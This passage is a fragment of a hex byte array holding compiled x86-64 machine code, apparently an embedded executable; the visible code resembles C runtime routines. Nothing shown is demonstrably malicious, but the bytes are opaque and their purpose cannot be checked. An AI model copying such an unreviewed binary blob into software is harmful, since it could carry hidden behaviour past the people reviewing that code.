0x8b, 0xc5, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0x52, 0x32, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x85, 0xd8, 0x0, 0x0, 0x0, 0x4d, 0x2b, 0xfe, 0x4a, 0x8d, 0xc, 0x33, 0x49, 0x8b, 0xd7, 0x4c, 0x8b, 0xcd, 0x4d, 0x8b, 0xc4, 0xe8, 0x35, 0x32, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x85, 0xbb, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x4f, 0x8, 0x44, 0x8d, 0x78, 0x8, 0x4c, 0x8b, 0x77, 0x10, 0x49, 0x3b, 0xce, 0xf, 0x85, 0x9d, 0x0, 0x0, 0x0, 0x48, 0x39, 0x37, 0x75, 0x2b, 0x41, 0x8b, 0xd7, 0x8d, 0x48, 0x4, 0xe8, 0x10, 0xf9, 0xff, 0xff, 0x33, 0xc9, 0x48, 0x89, 0x7, 0xe8, 0x7e, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xf, 0x48, 0x85, 0xc9, 0x74, 0x42, 0x48, 0x8d, 0x41, 0x20, 0x48, 0x89, 0x4f, 0x8, 0x48, 0x89, 0x47, 0x10, 0xeb, 0x6d, 0x4c, 0x2b, 0x37, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x49, 0xc1, 0xfe, 0x3, 0x4c, 0x3b, 0xf0, 0x77, 0x1e, 0x48, 0x8b, 0xf, 0x4b, 0x8d, 0x2c, 0x36, 0x48, 0x8b, 0xd5, 0x4d, 0x8b, 0xc7, 0xe8, 0x98, 0x14, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0x22, 0x33, 0xc9, 0xe8, 0x34, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x2c, 0xf9, 0xff, 0xff, 0xbe, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0x20, 0xf9, 0xff, 0xff, 0x8b, 0xc6, 0xe9, 0x2, 0xff, 0xff, 0xff, 0x4a, 0x8d, 0xc, 0xf0, 0x48, 0x89, 0x7, 0x48, 0x89, 0x4f, 0x8, 0x48, 0x8d, 0xc, 0xe8, 0x48, 0x89, 0x4f, 0x10, 0x33, 0xc9, 0xe8, 0xff, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x4f, 0x8, 0x48, 0x89, 0x19, 0x4c, 0x1, 0x7f, 0x8, 0xeb, 0xcb, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x74, 0x24, 0x20, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0x2a, 0xf7, 0xff, 0xff, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x8d, 0xac, 0x24, 0xc0, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, 0x40, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xdb, 0x1d, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0x30, 0x2, 0x0, 0x0, 0x4d, 0x8b, 0xe0, 0x48, 0x8b, 0xf9, 0x48, 0xbb, 0x1, 0x8, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x48, 0x3b, 0xd1, 0x74, 0x22, 0x8a, 0x2, 0x2c, 0x2f, 0x3c, 0x2d, 0x77, 0xa, 0x48, 0xf, 0xbe, 0xc0, 0x48, 0xf, 0xa3, 0xc3, 0x72, 0x10, 0x48, 0x8b, 0xcf, 0xe8, 0x5a, 0x36, 0x0, 0x0, 0x48, 0x8b, 0xd0, 0x48, 0x3b, 0xc7, 0x75, 0xde, 0x44, 0x8a, 0x2, 0x41, 0x80, 0xf8, 0x3a, 0x75, 0x1e, 0x48, 0x8d, 0x47, 0x1, 0x48, 0x3b, 0xd0, 0x74, 0x15, 0x4d, 0x8b, 0xcc, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xe8, 0xf4, 0xfd, 0xff, 0xff, 0xe9, 0xa3, 0x2, 0x0, 0x0, 0x41, 0x80, 0xe8, 0x2f, 0x45, 0x33, 0xf6, 0x41, 0x80, 0xf8, 0x2d, 0x77, 0xc, 0x49, 0xf, 0xbe, 0xc0, 0x48, 0xf, 0xa3, 0xc3, 0xb0, 0x1, 0x72, 0x3, 0x41, 0x8a, 0xc6, 0x48, 0x2b, 0xd7, 0x4c, 0x89, 0x74, 0x24, 0x40, 0x48, 0xff, 0xc2, 0x4c, 0x89, 0x74, 0x24, 0x48, 0xf6, 0xd8, 0x4c, 0x89, 0x74, 0x24, 0x50, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0x4c, 0x89, 0x74, 0x24, 0x58, 0x4d, 0x1b, 0xed, 0x4c, 0x89, 0x74, 0x24, 0x60, 0x4c, 0x23, 0xea, 0x44, 0x88, 0x74, 0x24, 0x68, 0x33, 0xd2, 0x4c, 0x89, 0x6c, 0x24, 0x38, 0xe8, 0x6e, 0x2, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x78, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x39, 0x48, 0xc, 0x75, 0x17, 0x44, 0x38, 0x75, 0x88, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x44, 0x8b, 0xc9, 0xeb, 0x38, 0xe8, 0xd7, 0x15, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x1a, 0x44, 0x38, 0x75, 0x88, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x15, 0x44, 0x38, 0x75, 0x88, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x45, 0x8b, 0xce, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0x48, 0x8d, 0x54, 0x24, 0x40, 0xe8, 0xda, 0xf7, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x4c, 0x8d, 0x45, 0xe0, 0x85, 0xc0, 0x44, 0x89, 0x74, 0x24, 0x28, 0x4c, 0x89, 0x74, 0x24, 0x20, 0x49, 0xf, 0x45, 0xce, 0x45, 0x33, 0xc9, 0x33, 0xd2, 0xff, 0x15, 0xf6, 0x7c, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x83, 0xf8, 0xff, 0x75, 0x2a, 0x4d, 0x8b, 0xcc, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xe8, 0xe9, 0xfc, 0xff, 0xff, 0x8b, 0xd8, 0x44, 0x38, 0x74, 0x24, 0x68, 0x74, 0xa, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xe8, 0x3a, 0xf7, 0xff, 0xff, 0x8b, 0xc3, 0xe9, 0x83, 0x1, 0x0, 0x0, 0x49, 0x8b, 0x74, 0x24, 0x8, 0x49, 0x2b, 0x34, 0x24, 0x48, 0xc1, 0xfe, 0x3, 0x33, 0xd2, 0x4c, 0x89, 0x75, 0xb0, 0x48, 0x8d, 0x4d, 0x90, 0x4c, 0x89, 0x75, 0xb8, 0x4c, 0x89, 0x75, 0xc0, 0x4c, 0x89, 0x75, 0xc8, 0x4c, 0x89, 0x75, 0xd0, 0x44, 0x88, 0x75, 0xd8, 0xe8, 0x77, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x45, 0x98, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x39, 0x48, 0xc, 0x75, 0x16, 0x44, 0x38, 0x75, 0xa8, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x90, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x44, 0x8b, 0xc9, 0xeb, 0x36, 0xe8, 0xe2, 0x14, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x19, 0x44, 0x38, 0x75, 0xa8, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x90, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x14, 0x44, 0x38, 0x75, 0xa8, 0x74, 0xb, 0x48, 0x8b, 0x45, 0x90, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x45, 0x8b, 0xce, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x55, 0xb0, 0x48, 0x8d, 0x4d, 0xc, 0xe8, 0x63, 0xf8, 0xff, 0xff, 0x4c, 0x8b, 0x75, 0xc0, 0x33, 0xd2, 0x85, 0xc0, 0x49, 0x8b, 0xce, 0x48, 0xf, 0x45, 0xca, 0x80, 0x39, 0x2e, 0x75, 0x1f, 0x8a, 0x41, 0x1, 0x84, 0xc0, 0x75, 0xf, 0x38, 0x55, 0xd8, 0x74, 0x3a, 0x49, 0x8b, 0xce, 0xe8, 0x6f, 0xf6, 0xff, 0xff, 0xeb, 0x30, 0x3c, 0x2e, 0x75, 0x5, 0x38, 0x51, 0x2, 0x74, 0xe8, 0x4d, 0x8b, 0xcc, 0x4d, 0x8b, 0xc5, 0x48, 0x8b, 0xd7, 0xe8, 0xf2, 0xfb, 0xff, 0xff, 0x44, 0x8b, 0xe8, 0x85, 0xc0, 0x75, 0x74, 0x38, 0x45, 0xd8, 0x74, 0x8, 0x49, 0x8b, 0xce, 0xe8, 0x42, 0xf6, 0xff, 0xff, 0x4c, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8d, 0x55, 0xe0, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xc8, 0x7b, 0x0, 0x0, 0x45, 0x33, 0xf6, 0x85, 0xc0, 0xf, 0x85, 0xff, 0xfe, 0xff, 0xff, 0x49, 0x8b, 0x4, 0x24, 0x49, 0x8b, 0x54, 0x24, 0x8, 0x48, 0x2b, 0xd0, 0x48, 0xc1, 0xfa, 0x3, 0x48, 0x3b, 0xf2, 0x74, 0x17, 0x48, 0x2b, 0xd6, 0x48, 0x8d, 0xc, 0xf0, 0x4c, 0x8d, 0xd, 0x3e, 0xf6, 0xff, 0xff, 0x45, 0x8d, 0x46, 0x8, 0xe8, 0x69, 0x2a, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x78, 0x7b, 0x0, 0x0, 0x44, 0x38, 0x74, 0x24, 0x68, 0x74, 0xa, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xe8, 0xdf, 0xf5, 0xff, 0xff, 0x33, 0xc0, 0xeb, 0x2b, 0x80, 0x7d, 0xd8, 0x0, 0x74, 0x8, 0x49, 0x8b, 0xce, 0xe8, 0xcd, 0xf5, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x4c, 0x7b, 0x0, 0x0, 0x80, 0x7c, 0x24, 0x68, 0x0, 0x74, 0xa, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xe8, 0xb3, 0xf5, 0xff, 0xff, 0x41, 0x8b, 0xc5, 0x48, 0x8b, 0x8d, 0x30, 0x2, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x31, 0x69, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x40, 0x3, 0x0, 0x0, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0xc6, 0x41, 0x18, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x8d, 0x71, 0x8, 0x48, 0x85, 0xd2, 0x74, 0x5, 0xf, 0x10, 0x2, 0xeb, 0x10, 0x83, 0x3d, 0xd9, 0x30, 0x1, 0x0, 0x0, 0x75, 0xd, 0xf, 0x10, 0x5, 0x60, 0x21, 0x1, 0x0, 0xf3, 0xf, 0x7f, 0x6, 0xeb, 0x4e, 0xe8, 0x9d, 0xeb, 0xff, 0xff, 0x48, 0x89, 0x7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0x88, 0x90, 0x0, 0x0, 0x0, 0x48, 0x89, 0xe, 0x48, 0x8b, 0x88, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x4f, 0x10, 0x48, 0x8b, 0xc8, 0xe8, 0x5a, 0x22, 0x0, 0x0, 0x48, 0x8b, 0xf, 0x48, 0x8d, 0x57, 0x10, 0xe8, 0xba, 0x22, 0x0, 0x0, 0x48, 0x8b, 0xf, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0xa8, 0x2, 0x75, 0xd, 0x83, 0xc8, 0x2, 0x89, 0x81, 0xa8, 0x3, 0x0, 0x0, 0xc6, 0x47, 0x18, 0x1, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xe9, 0x43, 0xf8, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x40, 0x33, 0xed, 0x41, 0x8b, 0xf1, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x1b, 0x40, 0x38, 0x6a, 0x28, 0x74, 0x4, 0x40, 0x88, 0x6a, 0x28, 0x48, 0x89, 0x6a, 0x10, 0x48, 0x89, 0x6a, 0x18, 0x48, 0x89, 0x6a, 0x20, 0xe9, 0xc3, 0x0, 0x0, 0x0, 0x66, 0x39, 0x29, 0x75, 0x34, 0x48, 0x39, 0x6a, 0x18, 0x75, 0x25, 0x40, 0x38, 0x6a, 0x28, 0x74, 0x4, 0x40, 0x88, 0x6a, 0x28, 0xe8, 0xf7, 0xf3, 0xff, 0xff, 0xb9, 0x22, 0x0, 0x0, 0x0, 0x89, 0x8, 0x8b, 0xc1, 0x40, 0x88, 0x6b, 0x28, 0x48, 0x89, 0x6b, 0x18, 0xe9, 0x95, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x42, 0x10, 0x40, 0x88, 0x28, 0xeb, 0xbe, 0x48, 0x89, 0x6c, 0x24, 0x38, 0x41, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x4c, 0x8b, 0xc7, 0x89, 0x6c, 0x24, 0x28, 0x33, 0xd2, 0x8b, 0xce, 0x48, 0x89, 0x6c, 0x24, 0x20, 0xe8, 0xe5, 0xd, 0x0, 0x0, 0x48, 0x63, 0xd0, 0x85, 0xc0, 0x75, 0x16, 0xff, 0x15, 0x10, 0x79, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x15, 0xf3, 0xff, 0xff, 0xe8, 0x9c, 0xf3, 0xff, 0xff, 0x8b, 0x0, 0xeb, 0x4c, 0x48, 0x8b, 0x4b, 0x18, 0x48, 0x3b, 0xd1, 0x76, 0xc, 0x40, 0x38, 0x6b, 0x28, 0x74, 0x8d, 0x40, 0x88, 0x6b, 0x28, 0xeb, 0x87, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x6c, 0x24, 0x38, 0x4c, 0x8b, 0xc7, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x33, 0xd2, 0x89, 0x4c, 0x24, 0x28, 0x8b, 0xce, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x8c, 0xd, 0x0, 0x0, 0x48, 0x98, 0x48, 0x85, 0xc0, 0x74, 0xa7, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x43, 0x20, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x60, 0xfe, 0xff, 0xff, 0x48, 0x81, 0xec, 0xa0, 0x2, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xcb, 0x18, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0x90, 0x1, 0x0, 0x0, 0x41, 0x8b, 0xf8, 0x48, 0x8b, 0xda, 0x41, 0xb8, 0x5, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x55, 0x80, 0xff, 0x15, 0xfb, 0x78, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x14, 0xff, 0x15, 0x51, 0x78, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x56, 0xf2, 0xff, 0xff, 0x33, 0xc0, 0xe9, 0xa4, 0x0, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x68, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0xc7, 0x48, 0x89, 0x5c, 0x24, 0x48, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x89, 0x5c, 0x24, 0x58, 0xc6, 0x44, 0x24, 0x70, 0x0, 0xe8, 0xb9, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x41, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x44, 0x39, 0x48, 0xc, 0x75, 0x15, 0x80, 0x7c, 0x24, 0x40, 0x0, 0x74, 0x47, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0xeb, 0x39, 0xe8, 0x22, 0x11, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x1a, 0x38, 0x44, 0x24, 0x40, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x16, 0x80, 0x7c, 0x24, 0x40, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x45, 0x33, 0xc9, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8d, 0x54, 0x24, 0x48, 0x48, 0x8d, 0x4d, 0x80, 0xe8, 0xeb, 0xfd, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0x8d, 0x90, 0x1, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x50, 0x66, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0xa0, 0x2, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x8b, 0xa, 0xe8, 0x84, 0xec, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc0, 0x18, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0xd, 0x8e, 0x27, 0x1, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x48, 0x85, 0xc9, 0x74, 0x6f, 0x48, 0x85, 0xc0, 0x74, 0x5d, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xc8, 0x41, 0x8d, 0x50, 0x7e, 0xf, 0x10, 0x0, 0xf, 0x11, 0x1, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x41, 0x60, 0x48, 0x3, 0xca, 0xf, 0x10, 0x48, 0x70, 0xf, 0x11, 0x49, 0xf0, 0x48, 0x3, 0xc2, 0x49, 0x83, 0xe9, 0x1, 0x75, 0xb6, 0x8a, 0x0, 0x88, 0x1, 0xeb, 0x27, 0x33, 0xd2, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0x25, 0xae, 0xff, 0xff, 0xe8, 0x58, 0xf1, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x11, 0xf0, 0xff, 0xff, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x41, 0x8d, 0x50, 0x7e, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0x48, 0x5, 0x19, 0x1, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0xd, 0xe4, 0x26, 0x1, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x85, 0xc9, 0x74, 0x5e, 0x48, 0x85, 0xc0, 0x74, 0x4c, 0xf, 0x10, 0x0, 0xf, 0x11, 0x1, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x41, 0x60, 0x48, 0x3, 0xca, 0xf, 0x10, 0x48, 0x70, 0xf, 0x11, 0x49, 0xf0, 0x48, 0x3, 0xc2, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xb6, 0xeb, 0x1d, 0x33, 0xd2, 0x41, 0xb8, 0x0, 0x1, 0x0, 0x0, 0xe8, 0x84, 0xad, 0xff, 0xff, 0xe8, 0xb7, 0xf0, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x70, 0xef, 0xff, 0xff, 0x48, 0x8b, 0x43, 0x8, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x11, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x2, 0x83, 0xf8, 0x1, 0x75, 0x1b, 0x48, 0x8b, 0x43, 0x8, 0x48, 0x8b, 0x8, 0x48, 0x8d, 0x5, 0x90, 0x16, 0x1, 0x0, 0x48, 0x39, 0x1, 0x74, 0x8, 0x48, 0x8b, 0x9, 0xe8, 0x13, 0xf1, 0xff, 0xff, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x10, 0x48, 0x8b, 0x43, 0x8, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x82, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x1, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x0, 0x8b, 0xf, 0xe8, 0x31, 0xeb, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x40, 0x8b, 0xd9, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x38, 0xfb, 0xff, 0xff, 0x83, 0x25, 0xf5, 0x25, 0x1, 0x0, 0x0, 0x83, 0xfb, 0xfe, 0x75, 0x12, 0xc7, 0x5, 0xe6, 0x25, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0xff, 0x15, 0x58, 0x76, 0x0, 0x0, 0xeb, 0x15, 0x83, 0xfb, 0xfd, 0x75, 0x14, 0xc7, 0x5, 0xcf, 0x25, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0xff, 0x15, 0x39, 0x76, 0x0, 0x0, 0x8b, 0xd8, 0xeb, 0x17, 0x83, 0xfb, 0xfc, 0x75, 0x12, 0x48, 0x8b, 0x44, 0x24, 0x28, 0xc7, 0x5, 0xb1, 0x25, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x8b, 0x58, 0xc, 0x80, 0x7c, 0x24, 0x38, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x33, 0xd2, 0x48, 0x83, 0xc1, 0x18, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0x6a, 0xac, 0xff, 0xff, 0x33, 0xd2, 0x48, 0x8d, 0x7b, 0xc, 0xf, 0xb7, 0xc2, 0x4c, 0x8d, 0xd, 0x9a, 0x15, 0x1, 0x0, 0x48, 0x89, 0x53, 0x4, 0x4c, 0x8b, 0xc3, 0x48, 0x89, 0x93, 0x20, 0x2, 0x0, 0x0, 0x8d, 0x4a, 0x6, 0x66, 0xf3, 0xab, 0x48, 0x8d, 0x5, 0x97, 0x15, 0x1, 0x0, 0x8b, 0xfa, 0x4c, 0x2b, 0xc0, 0x4a, 0x8d, 0xc, 0xf, 0x48, 0xff, 0xc7, 0x8a, 0x41, 0x18, 0x41, 0x88, 0x44, 0x8, 0x30, 0x48, 0x81, 0xff, 0x1, 0x1, 0x0, 0x0, 0x7c, 0xe8, 0x48, 0x8d, 0x5, 0x74, 0x16, 0x1, 0x0, 0x48, 0x2b, 0xd8, 0x4a, 0x8d, 0xc, 0xa, 0x48, 0xff, 0xc2, 0x8a, 0x81, 0x19, 0x1, 0x0, 0x0, 0x88, 0x84, 0xb, 0x32, 0x2, 0x0, 0x0, 0x48, 0x81, 0xfa, 0x0, 0x1, 0x0, 0x0, 0x7c, 0xe3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48, 0x8d, 0xac, 0x24, 0x80, 0xf9, 0xff, 0xff, 0x48, 0x81, 0xec, 0x80, 0x7, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xbf, 0x14, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0x70, 0x6, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x8b, 0x49, 0x4, 0x81, 0xf9, 0xe9, 0xfd, 0x0, 0x0, 0xf, 0x84, 0x47, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x50, 0xff, 0x15, 0x30, 0x75, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0x34, 0x1, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0xbb, 0x0, 0x1, 0x0, 0x0, 0x88, 0x1, 0xff, 0xc0, 0x48, 0xff, 0xc1, 0x3b, 0xc3, 0x72, 0xf5, 0x8a, 0x44, 0x24, 0x56, 0x48, 0x8d, 0x54, 0x24, 0x56, 0xc6, 0x44, 0x24, 0x70, 0x20, 0xeb, 0x20, 0x44, 0xf, 0xb6, 0x42, 0x1, 0xf, 0xb6, 0xc8, 0xeb, 0xb, 0x3b, 0xcb, 0x73, 0xc, 0xc6, 0x44, 0xc, 0x70, 0x20, 0xff, 0xc1, 0x41, 0x3b, 0xc8, 0x76, 0xf0, 0x48, 0x83, 0xc2, 0x2, 0x8a, 0x2, 0x84, 0xc0, 0x75, 0xdc, 0x8b, 0x47, 0x4, 0x4c, 0x8d, 0x44, 0x24, 0x70, 0x83, 0x64, 0x24, 0x30, 0x0, 0x44, 0x8b, 0xcb, 0x89, 0x44, 0x24, 0x28, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x85, 0x70, 0x2, 0x0, 0x0, 0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x6d, 0x2d, 0x0, 0x0, 0x83, 0x64, 0x24, 0x40, 0x0, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x8b, 0x47, 0x4, 0x44, 0x8b, 0xc3, 0x48, 0x8b, 0x97, 0x20, 0x2, 0x0, 0x0, 0x33, 0xc9, 0x89, 0x44, 0x24, 0x38, 